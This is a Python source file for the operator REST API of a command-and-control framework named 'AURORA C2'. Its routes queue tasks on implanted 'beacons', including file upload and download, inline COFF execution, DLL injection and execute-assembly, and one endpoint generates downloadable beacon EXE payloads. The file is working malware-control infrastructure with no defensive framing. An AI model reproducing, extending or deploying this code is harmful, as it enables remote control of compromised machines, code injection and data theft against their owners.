"""
AURORA C2 - Operator REST API routes.
"""
from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import Response

from coff_parser import CoffParseError, prepare_inline_execute_task
from dll_parser import DllParseError, prepare_dllinject_task
from assembly_parser import AssemblyParseError, prepare_execute_assembly_task
from payload_builder import PayloadError, generate_beacon, get_template_info
import config
import database as db
from app_state import get_conn, reload_listener_sockets
from auth import require_op
from commands import CMD_TYPE_MAP
from crypto import create_token, verify_password
from models import ConsoleLineReq, ListenerReq, LocalUploadChunkReq, LoginReq, PayloadGenReq, TaskReq
from transfers import (
    TransferError,
    prepare_download_task,
    prepare_upload_task,
    split_one_path,
    split_two_paths,
    stage_browser_upload_chunk,
)
from runtime import (
    append_console_line,
    create_task_session,
    delete_beacon_session,
    get_beacon_session,
    get_server_started_at,
    list_beacon_sessions,
    list_console_lines,
    list_task_sessions,
)
from ws import ws_broadcast_sync

router = APIRouter()


@router.post("/api/login")
async def api_login(req: LoginReq):
    conn = get_conn()
    op = db.get_operator(conn, req.username)
    if not op or not verify_password(req.password, op["password_hash"]):
        raise HTTPException(401, "Invalid credentials")

    token = create_token(
        req.username, config.JWT_SECRET, config.JWT_ALGO, config.JWT_EXP_HOURS
    )
    db.log_event(conn, "INFO", f"Operator '{req.username}' logged in")
    return {"token": token, "username": req.username}


@router.post("/api/logout")
async def api_logout(user: str = Depends(require_op)):
    conn = get_conn()
    db.log_event(conn, "INFO", f"Operator '{user}' logged out")
    return {"ok": True}


@router.get("/api/server-info")
async def api_server_info(user: str = Depends(require_op)):
    return {"started_at": get_server_started_at()}


@router.get("/api/beacons")
async def api_beacons(user: str = Depends(require_op)):
    return list_beacon_sessions()


@router.get("/api/beacons/{bid}")
async def api_beacon_detail(bid: str, user: str = Depends(require_op)):
    b = get_beacon_session(bid)
    if not b:
        raise HTTPException(404, "Beacon not found")

    b["tasks"] = list_task_sessions(bid)
    return b


@router.get("/api/beacons/{bid}/console")
async def api_beacon_console(bid: str, user: str = Depends(require_op)):
    if not get_beacon_session(bid):
        raise HTTPException(404, "Beacon not found")
    return list_console_lines(bid)


@router.post("/api/beacons/{bid}/console-line")
async def api_beacon_console_line(bid: str, req: ConsoleLineReq, user: str = Depends(require_op)):
    if not get_beacon_session(bid):
        raise HTTPException(404, "Beacon not found")
    cls = req.cls if req.cls in ("cmd", "result", "error", "pending") else "result"
    line = append_console_line(bid, cls, req.text[:20000])
    ws_broadcast_sync({"type": "console_changed", "beacon_id": bid})
    return line


@router.delete("/api/beacons/{bid}")
async def api_beacon_delete(bid: str, user: str = Depends(require_op)):
    conn = get_conn()
    delete_beacon_session(bid)
    db.log_event(conn, "WARN", f"Beacon {bid} removed by {user}", bid)
    ws_broadcast_sync({"type": "beacon_delete", "beacon_id": bid})
    return {"ok": True}


@router.get("/api/listeners")
async def api_listeners(user: str = Depends(require_op)):
    conn = get_conn()
    return db.list_listeners(conn)


@router.post("/api/listeners")
async def api_listener_create(req: ListenerReq, user: str = Depends(require_op)):
    conn = get_conn()
    try:
        listener = db.create_listener(conn, req.model_dump())
    except Exception as exc:
        raise HTTPException(400, str(exc))
    db.log_event(conn, "INFO", f"Listener {listener['id']} created by {user}")
    ws_broadcast_sync({"type": "listeners_changed"})
    return listener


@router.put("/api/listeners/{listener_id}")
async def api_listener_update(listener_id: str, req: ListenerReq, user: str = Depends(require_op)):
    conn = get_conn()
    try:
        listener = db.update_listener(conn, listener_id, req.model_dump())
    except KeyError:
        raise HTTPException(404, "Listener not found")
    except Exception as exc:
        raise HTTPException(400, str(exc))
    db.log_event(conn, "INFO", f"Listener {listener_id} updated by {user}")
    ws_broadcast_sync({"type": "listeners_changed"})
    return listener


@router.delete("/api/listeners/{listener_id}")
async def api_listener_delete(listener_id: str, user: str = Depends(require_op)):
    conn = get_conn()
    try:
        db.delete_listener(conn, listener_id)
    except ValueError as exc:
        raise HTTPException(400, str(exc))
    db.log_event(conn, "WARN", f"Listener {listener_id} deleted by {user}")
    ws_broadcast_sync({"type": "listeners_changed"})
    return {"ok": True}


@router.post("/api/listeners/reload")
async def api_listener_reload(user: str = Depends(require_op)):
    conn = get_conn()
    try:
        await reload_listener_sockets()
    except RuntimeError as exc:
        raise HTTPException(503, str(exc))
    except Exception as exc:
        db.log_event(conn, "ERROR", f"Listener reload failed by {user}: {exc}")
        raise HTTPException(500, f"Listener reload failed: {exc}")

    db.log_event(conn, "WARN", f"Listeners reloaded by {user}")
    ws_broadcast_sync({"type": "listeners_changed"})
    return {"ok": True}


@router.post("/api/local-upload-chunk")
async def api_local_upload_chunk(
    req: LocalUploadChunkReq,
    user: str = Depends(require_op),
):
    try:
        return stage_browser_upload_chunk(
            req.upload_id,
            req.filename,
            req.offset,
            req.data_b64,
            req.eof,
        )
    except TransferError as exc:
        raise HTTPException(400, str(exc))


@router.post("/api/beacons/{bid}/task")
async def api_beacon_task(bid: str, req: TaskReq, user: str = Depends(require_op)):
    b = get_beacon_session(bid)
    if not b:
        raise HTTPException(404, "Beacon not found")

    command = req.command.strip()
    args = req.args.strip()
    if command not in CMD_TYPE_MAP:
        raise HTTPException(400, f"Unknown command: {command}")

    task_args = args
    display_args = args
    meta = {"source": req.source}
    try:
        if command == "upload":
            local_path, remote_path = split_two_paths(args, "upload <local_path> <remote_path>")
            task_args, display_args, transfer_meta = prepare_upload_task(local_path, remote_path)
            meta.update(transfer_meta)
        elif command == "download":
            remote_path = split_one_path(args, "download <remote_path>")
            task_args, display_args, transfer_meta = prepare_download_task(remote_path)
            meta.update(transfer_meta)
        elif command == "inline-execute":
            task_args, display_args, transfer_meta = prepare_inline_execute_task(args)
            meta.update(transfer_meta)
        elif command == "dllinject":
            task_args, display_args, transfer_meta = prepare_dllinject_task(args)
            meta.update(transfer_meta)
        elif command == "execute-assembly":
            task_args, display_args, transfer_meta = prepare_execute_assembly_task(args)
            meta.update(transfer_meta)
    except (TransferError, CoffParseError, DllParseError, AssemblyParseError) as exc:
        raise HTTPException(400, str(exc))

    tid = create_task_session(bid, command, task_args, display_args=display_args, meta=meta)
    if req.source == "console":
        cmd_line = f"{command} {display_args}".strip()
        append_console_line(bid, "cmd", cmd_line, task_id=tid, kind="cmd")
        append_console_line(bid, "pending", "[pending] waiting for beacon...", task_id=tid, kind="pending")
    ws_broadcast_sync({
        "type": "task_queued",
        "beacon_id": bid,
        "task_id": tid,
        "command": command,
        "args": display_args,
        "source": req.source,
    })
    return {"ok": True, "task_id": tid}


@router.get("/api/beacons/{bid}/tasks")
async def api_beacon_tasks(bid: str, user: str = Depends(require_op)):
    return list_task_sessions(bid)


@router.get("/api/events")
async def api_events(user: str = Depends(require_op)):
    conn = get_conn()
    return db.list_events(conn)


@router.delete("/api/events")
async def api_events_clear(user: str = Depends(require_op)):
    conn = get_conn()
    db.clear_events(conn)
    return {"ok": True}


# ══════════════════════════════════════════════════════
#  Payload generation
# ══════════════════════════════════════════════════════

@router.get("/api/payloads/info")
async def api_payload_info(user: str = Depends(require_op)):
    """Return template + resource availability for the payload generator UI."""
    return get_template_info()


@router.post("/api/payloads/generate")
async def api_payload_generate(req: PayloadGenReq, user: str = Depends(require_op)):
    """Generate a beacon EXE payload for the specified listener."""
    try:
        payload = generate_beacon(req.listener_id, req.sleep, req.jitter)
    except PayloadError as exc:
        raise HTTPException(400, str(exc))
    except Exception as exc:
        raise HTTPException(500, f"Payload generation failed: {exc}")

    db.log_event(
        get_conn(), "WARN",
        f"Payload generated by {user} for listener={req.listener_id}",
    )
    ws_broadcast_sync({"type": "payload_generated", "listener_id": req.listener_id})

    filename = f"aurora_beacon_{req.listener_id}.exe"
    return Response(
        content=payload,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )
